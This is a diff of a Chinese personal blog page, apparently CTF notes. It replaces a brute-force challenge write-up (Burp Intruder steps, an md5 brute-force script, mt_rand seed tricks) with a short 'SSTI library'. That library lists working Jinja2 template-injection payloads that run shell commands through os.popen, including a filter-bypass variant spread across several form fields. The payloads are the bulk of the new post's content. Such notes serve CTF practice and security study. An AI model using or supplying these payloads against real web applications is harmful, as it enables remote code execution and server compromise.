@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ctfshow-爆破, 幻影旅团">
-    <meta name="description" content="ctfshow的wp">
+    <meta name="keywords" content="ssti库, 幻影旅团">
+    <meta name="description" content="ssti的遇到的做题写法(不定期更新)">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ctfshow-爆破 | 幻影旅团</title>
+    <title>ssti库 | 幻影旅团</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -259,12 +259,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/images/%E7%88%86%E7%A0%B4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/images/ssti%E5%BA%93.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ctfshow-爆破</h1>
+                    <h1 class="description center-align post-title">ssti库</h1>
                 </div>
             </div>
         </div>
@@ -380,8 +380,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%88%86%E7%A0%B4/">
-                                <span class="chip bg-color">爆破</span>
+                            <a href="/tags/ssti/">
+                                <span class="chip bg-color">ssti</span>
                             </a>
                         
                     </div>
@@ -392,8 +392,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/ctfshow/" class="post-category">
-                                ctfshow
+                            <a href="/categories/ssti/" class="post-category">
+                                ssti
                             </a>
                         
                     </div>
@@ -405,21 +405,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-24
+                    2022-03-07
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-13
+                    2022-03-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    234
+                    210
                 </div>
                 
 
@@ -444,54 +444,21 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="web-21"><a href="#web-21" class="headerlink" title="web 21"></a>web 21</h2><p>burp 抓包</p>
-<p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105406410.png" alt="image-20220124105406410"></p>
-<p>用户名密码都base64加密了</p>
-<p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105444068.png" alt="image-20220124105444068"></p>
-<p>抓到的包发送到Intruder</p>
-<p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105604338.png" alt="image-20220124105604338"></p>
-<p>选择 custom iterator(自定义迭代器)-&gt;position 1admin  position 2 :  position 3 字典-&gt;base64编码</p>
-<p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105805789.png" alt="image-20220124105805789"></p>
-<p><img src="/2022/01/24/ctfshow-bao-po/image-20220124105934117.png" alt="image-20220124105934117"></p>
-<h2 id="web-22"><a href="#web-22" class="headerlink" title="web 22"></a>web 22</h2><p><a target="_blank" rel="noopener" href="http://z.zcjun.com/">http://z.zcjun.com/</a> 在线子域名爆破 (此题不能爆破出来)</p>
-<h2 id="web-23"><a href="#web-23" class="headerlink" title="web 23"></a>web 23</h2><p>根据源码写个脚本</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+                <p>1.这里&lt;通关人&gt;没任何过滤，但有长度限制，只能25个字符以内，&lt;排名&gt;和&lt;通关时间&gt;都有严格的校验，&lt;通关感言&gt;有较严格的过滤，包括下划线、单双引号、request、中括号、百分号等一些关键字符</p>
+<p>导致只通过其中一个输入框无法getshell，需要多个输入框进行配合getshell</p>
+<pre class="line-numbers language-none"><code class="language-none">/edit?a=__init__&amp;b=__globals__&amp;c=__getitem__&amp;d=os&amp;e=popen&amp;f=whoami&amp;g=read
+POST:
+name={%25set r=request.args%25}&amp;rank=1&amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;time=2021年11月11日<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<span class="token variable">$dict</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789qwertyuiopasdfghjklzxcvbnm"</span><span class="token punctuation">;</span>
+<p>2.目前遇到最短payload</p>
+<pre class="line-numbers language-none"><code class="language-none">{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">36</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$dict</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$dict</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"加密后的md5值为："</span><span class="token operator">.</span><span class="token variable">$token</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
-                <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"解密后的值为："</span><span class="token operator">.</span><span class="token variable">$dict</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$dict</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>3.</p>
+<pre class="line-numbers language-none"><code class="language-none">{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>运行后得到结果</p>
-<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<p>4.</p>
+<pre class="line-numbers language-none"><code class="language-none">{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
- <span class="token variable">$s</span><span class="token operator">=</span> <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
- <span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token delimiter important">?&gt;</span></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="web-25"><a href="#web-25" class="headerlink" title="web 25"></a>web 25</h2><p>根据题目 ?r=0 可以得到$rand进而得到mt_rand()</p>
-<p>逆推工具尝试逆推出种子：工具地址：<a target="_blank" rel="noopener" href="https://github.com/Al1ex/php_mt_seed">https://github.com/Al1ex/php_mt_seed</a></p>
-<h2 id="web-26"><a href="#web-26" class="headerlink" title="web 26"></a>web 26</h2><p>右键查看源代码</p>
-<p><img src="/2022/01/24/ctfshow-bao-po/image-20220124194036551.png" alt="image-20220124194036551"></p>
-<h2 id="web-27"><a href="#web-27" class="headerlink" title="web 27"></a>web 27</h2><p>爆破日期</p>
-<p><img src="/2022/01/24/ctfshow-bao-po/image-20220124194511005.png" alt="image-20220124194511005"></p>
-<p><img src="C:/Users/86181/AppData/Roaming/Typora/typora-user-images/image-20220124194428100.png" alt="image-20220124194428100"></p>
-<h2 id="web-28"><a href="#web-28" class="headerlink" title="web 28"></a>web 28</h2><p><img src="/2022/01/24/ctfshow-bao-po/image-20220124200059003.png" alt="image-20220124200059003"></p>
-<p><img src="/2022/01/24/ctfshow-bao-po/image-20220124200125520.png" alt="image-20220124200125520"></p>
 
                 
             </div>
@@ -518,7 +485,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://54Wa1234.github.io/2022/01/24/ctfshow-bao-po/">http://54Wa1234.github.io/2022/01/24/ctfshow-bao-po/</a>
+                    <a href="http://54Wa1234.github.io/2022/03/07/ssti-ku/">http://54Wa1234.github.io/2022/03/07/ssti-ku/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -556,8 +523,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%88%86%E7%A0%B4/">
-                                    <span class="chip bg-color">爆破</span>
+                                <a href="/tags/ssti/">
+                                    <span class="chip bg-color">ssti</span>
                                 </a>
                             
                         </div>
@@ -731,45 +698,47 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/02/11/ctfshow-fan-xu-lie-hua/">
+                <a href="/2022/03/07/ssti-ku/">
                     <div class="card-image">
                         
-                        <img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.jpg" class="responsive-img" alt="ctfshow-反序列化">
+                        <img src="/images/ssti%E5%BA%93.jpg" class="responsive-img" alt="ssti库">
                         
-                        <span class="card-title">ctfshow-反序列化</span>
+                        <span class="card-title">ssti库</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ctfshow-反序列化wp
+                            ssti的遇到的做题写法(不定期更新)
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-07
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/ctfshow/" class="post-category">
-                                    ctfshow
+                            <a href="/categories/ssti/" class="post-category">
+                                    ssti
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                        <span class="chip bg-color">反序列化</span>
+                    <a href="/tags/ssti/">
+                        <span class="chip bg-color">ssti</span>
                     </a>
                     
                 </div>
@@ -783,30 +752,30 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/23/ctfshow-xin-xi-shou-ji/">
+                <a href="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/">
                     <div class="card-image">
                         
-                        <img src="/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.jpg" class="responsive-img" alt="ctfshow-信息收集">
+                        <img src="/images/yii2%E6%A1%86%E6%9E%B6.jpg" class="responsive-img" alt="yii2框架 反序列化漏洞复现">
                         
-                        <span class="card-title">ctfshow-信息收集</span>
+                        <span class="card-title">yii2框架 反序列化漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ctfshow-信息收集wp
+                            yii2框架 反序列化漏洞复现
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-23
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-26
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/ctfshow/" class="post-category">
-                                    ctfshow
+                            <a href="/categories/yii2/" class="post-category">
+                                    yii2
                                 </a>
                             
                             
@@ -816,8 +785,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                        <span class="chip bg-color">信息收集</span>
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">反序列化</span>
                     </a>
                     
                 </div>
